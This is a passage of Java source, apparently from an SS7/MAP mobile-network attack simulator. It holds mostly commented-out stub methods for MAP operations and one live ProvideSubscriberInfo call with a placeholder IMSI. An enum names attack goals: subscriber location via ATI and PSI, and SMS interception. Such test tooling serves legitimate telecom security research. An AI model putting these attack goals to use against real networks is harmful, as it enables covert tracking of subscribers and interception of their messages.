        //this.sgsnAhlrA.getTestAttackClient().performUpdateGPRSLocation();
    }

    private void performCheckIMEI() {
        //this.vlrAmscA.getTestAttackServer().performCheckIMEI();
        //this.mscAeirA.getTestAttackClient().performCheckIMEI();
        //this.sgsnAeirA.getTestAttackClient().performCheckIMEI();
    }

    private void performInsertSubscriberData() {
        //this.hlrAvlrA.getTestAttackClient().performInsertSubscriberData();
    }

    private void performDeleteSubscriberData() {
        //this.hlrAvlrA.getTestAttackClient().performDeleteSubscriberData();
    }

    private void performForwardCheckSSIndication() {
        //this.hlrAmscA.getTestAttackServer().performForwardCheckSSIndication();
    }

    private void performRestoreData() {
        //this.vlrAhlrA.getTestAttackServer().performRestoreData();
    }

    private void performAnyTimeInterrogation() {
        //this.gsmscfAhlrA.getTestAttackClient().performAnyTimeInterrogation();
    }

    private void performProvideSubscriberInfo() {
        this.mscAvlrA.getTestAttackClient().performProvideSubscriberInfoRequest(new IMSIImpl("123"));
    }

    private void performActivateTraceMode() {
        //this.hlrAvlrA.getTestAttackServer().performActivateTraceMode();
    }

    private void performSendIMSI() {

    }

    private void performSendRoutingInformation() {
        //this.mscAhlrA.getTestAttackClient().performSendRoutingInformation();
    }

    private void performProvideRoamingNumber() {
        //this.hlrAvlrA.getTestAttackClient().performProvideRoamingNumber();
    }

    private void performRegisterSS() {
        //this.mscAvlrA.getTestAttackClient().performRegisterSS();
        //this.vlrAhlrA.getTestAttackServer().performRegisterSS();
    }

    private void performEraseSS() {
        //this.mscAvlrA.getTestAttackClient().performEraseSS();
        //this.vlrAhlrA.getTestAttackServer().performEraseSS();
    }

    private void performActivateSS() {
        //this.mscAvlrA.getTestAttackClient().performActivateSS();
        //this.vlrAhlrA.getTestAttackServer().performActivateSS();
    }

    private void performDeactivateSS() {
        //this.mscAvlrA.getTestAttackClient().performDeactivateSS();
        //this.vlrAhlrA.getTestAttackServer().performDeactivateSS();
    }

    private void performInterrogateSS() {
        //this.mscAvlrA.getTestAttackClient().performInterrogateSS();
        //this.vlrAhlrA.getTestAttackServer().performInterrogateSS();
    }

    private void performRegisterPassword() {
        //this.mscAvlrA.getTestAttackClient().performRegisterSS();
        //this.vlrAhlrA.getTestAttackServer().performRegisterSS();
    }

    private void performGetPassword() {
        //this.hlrAvlrA.getTestAttackClient().performGetPassword();
        //this.vlrAmscA.getTestAttackServer().performGetPassword();
    }

    private void performProcessUnstructuredSSRequest() {
        //this.mscAvlrA.getTestAttackClient().performProcessUnstructuredSSRequest();
        //this.vlrAhlrA.getTestAttackClient().performProcessUnstructuredSSRequest();
        //this.vlrAgsmscfA.getTestAttackClient().performProcessUnstructuredSSRequest();
    }

    private void performUnstructuredSSRequest() {
        //this.hlrAvlrA.getTestAttackClient().performUnstructuredSSRequest();
        //this.gsmscfAvlrA.getTestAttackClient().performUnstructuredSSRequest();
        //this.vlrAmscA.getTestAttackClient().performUnstructuredSSRequest();
    }

    private void performUnstructuredSSNotify () {
        //this.hlrAvlrA.getTestAttackClient().performUnstructuredSSRequest();
        //this.gsmscfAvlrA.getTestAttackClient().performUnstructuredSSRequest();
        //this.vlrAmscA.getTestAttackClient().performUnstructuredSSRequest();
    }

    private void performSendRoutingInfoForSM() {
        //this.mscAhlrA.getTestAttackClient().performSendRoutingInfoForSM("", "");
        //this.smscAhlrA.getTestAttackClient().performSendRoutingInfoForSM("", "");
    }

    private void performMoForwardSM() {
        //this.mscAsmscA.getTestAttackClient().performMoForwardSM("", "", "");
    }

    private void performReportSMDeliveryStatus() {
        //this.mscAhlrA.getTestAttackClient().performReportSMDeliveryStatus();
    }

    private void performReadyForSM() {
        //this.mscAvlrA.getTestAttackClient().performReadyForSM();
        //this.vlrAhlrA.getTestAttackServer().performReadyForSM();
        //this.sgsnAhlrA.getTestAttackClient().performReadyForSM();
        //this.smscAhlrA.getTestAttackClient().performReadyForSM();
    }

    private void performAlertServiceCentre() {
        //this.hlrAmscA.getTestAttackServer().performAlertServiceCentre();
    }

    private void performInformServiceCentre() {
        //this.hlrAmscA.getTestAttackServer().performInformServiceCentre();
    }

    private void performMtForwardSM() {
        //this.mscAmscB.getTestAttackClient().performMtForwardSM();
        //this.mscAsgsnA.getTestAttackClient().performMtForwardSM();
    }

    private void performSendRoutingInfoForGPRS() {
        //this.sgsnAhlrA.getTestAttackClient().performSendRoutingInfoForGPRS();
    }

    @Override
    public void stop() {

    }

    @Override
    public void execute() {

    }

    @Override
    public String getState() {
        return null;
    }

    public enum SimpleAttackGoal {
        LOCATION_ATI,
        LOCATION_PSI,
        INTERCEPT_SMS,
    }
}
